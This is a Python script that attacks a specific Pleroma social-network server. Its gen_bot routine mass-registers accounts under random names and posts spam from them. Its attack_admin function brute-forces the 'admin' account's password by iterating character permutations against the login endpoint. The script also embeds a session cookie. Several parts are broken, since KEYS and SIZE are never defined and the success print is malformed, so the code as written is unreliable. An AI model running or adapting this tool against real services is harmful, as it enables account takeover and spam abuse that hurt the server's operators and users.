import requests
import base64
import random

def gen_account(username,fullname,passwd,email_main):
    data=('''\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="username"\x0d\x0a\
\x0d\x0a\
'''+username+'''\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="fullname"\x0d\x0a\
\x0d\x0a\
'''+fullname+'''\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="email"\x0d\x0a\
\x0d\x0a\
'''+email_main+'''@test.co.jp\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="bio"\x0d\x0a\
\x0d\x0a\
This is spam!!\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="password"\x0d\x0a\
\x0d\x0a\
'''+passwd+'''\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="confirm"\x0d\x0a\
\x0d\x0a\
'''+passwd+'''\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4\x0d\x0a\
Content-Disposition: form-data; name="nickname"\x0d\x0a\
\x0d\x0a\
'''+username+'''\x0d\x0a\
------WebKitFormBoundaryqnTEz6EqvVEBwVd4-- \x0d\x0a\
''').encode()
    header = {
        'Connection':'close',
        'Content-Length':str(len(data)),
        'Origin':'https://pleroma.yonkoudai.space',
        'User-Agent':'Enuwai Tool',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryqnTEz6EqvVEBwVd4',
        'Accept':'*/*',
        'Referer':'https://pleroma.yonkoudai.space/main/all',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'ja,en-US;q=0.9,en;q=0.8',
        }

    r = requests.post('https://pleroma.yonkoudai.space/api/account/register.json',headers=header,data=data)
    return r.status_code

def tweet(username,passwd,tweet_content):
    url = 'https://pleroma.yonkoudai.space/api/statuses/update.json'
    data = ('''\
------WebKitFormBoundaryB33cnIA8Ab3Dr86T\x0d\x0a\
Content-Disposition: form-data; name="status"\x0d\x0a\
\x0d\x0a\
'''+tweet_content+'''\x0d\x0a\
------WebKitFormBoundaryB33cnIA8Ab3Dr86T\x0d\x0a\
Content-Disposition: form-data; name="source"\x0d\x0a\
\x0d\x0a\
Pleroma FE\x0d\x0a\
------WebKitFormBoundaryB33cnIA8Ab3Dr86T\x0d\x0a\
Content-Disposition: form-data; name="media_ids"\x0d\x0a\
\x0d\x0a\
\x0d\x0a\
------WebKitFormBoundaryB33cnIA8Ab3Dr86T--\x0d\x0a''').encode()
    hash = base64.b64encode((username+':'+passwd).encode())
    header={
        'Connection':'close',
        'Content-Length':str(len(data)),
        'AuthoriZation':'Basic '+hash.decode(),
        'Origin':'https://pleroma.yonkoudai.space',
        'User-Agent':'Enuwai Tool',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryB33cnIA8Ab3Dr86T',
        'Accept':'*/*',
        'Referer':'https://pleroma.yonkoudai.space/main/all',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'ja,en-US;q=0.9,en;q=0.8',
        'Cookie':'_pleroma_key=SFMyNTY.g3QAAAABbQAAAAd1c2VyX2lkYSI.1BuD8JHo67GUX6clisgSx58daSvmAxiRAqIKuHz3an8'
        }
    r = requests.post(url,data=data,headers=header)
    return r.status_code

cs = "abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ0123456789"
def attack_admin():
    import itertools
    url = 'https://pleroma.yonkoudai.space/api/account/verify_credentials.json'
    for i in range(5,10):
        g = itertools.permutations(cs,i)
        for j in g:
            pas="".join(j)
            print("\r"+"Checking:"+pas,end="")
            r = requests.post(url,auth=("admin",pas))
            if  r.status_code == 200:
                print("username: admin, password: ",+pas)
                break
            print(r.status_code)
NICKNAMES = ["John","Jack","Warren","ちくたく","ともろう","にゃんちゅう","Tom",]
CONTENTS = ["これはスパムだよ〜","I'm a spam","I'm a robot","僕はスパムじゃない"]

def gen_bot():
    import sys
    while True:
        newname = "".join(random.choices(cs,k=random.randint(4,10)))
        while newname in KEYS:
            newname = "".join(random.choices(cs,k=random.randint(4,10)))
        newpas = "".join(random.choices(cs,k=random.randint(4,10)))
        status=gen_account(newname,random.choice(NICKNAMES),newpas,"".join(random.choices(cs,k=random.randint(5,10))))
        if status!=200:
            continue
        print(newname,newpas)
        print("\r"+str(SIZE),end="",file=sys.stderr)
        status=tweet(newname,newpas,random.choice(CONTENTS))
        if status!=200:
            continue
        if SIZE==1000:
            break   


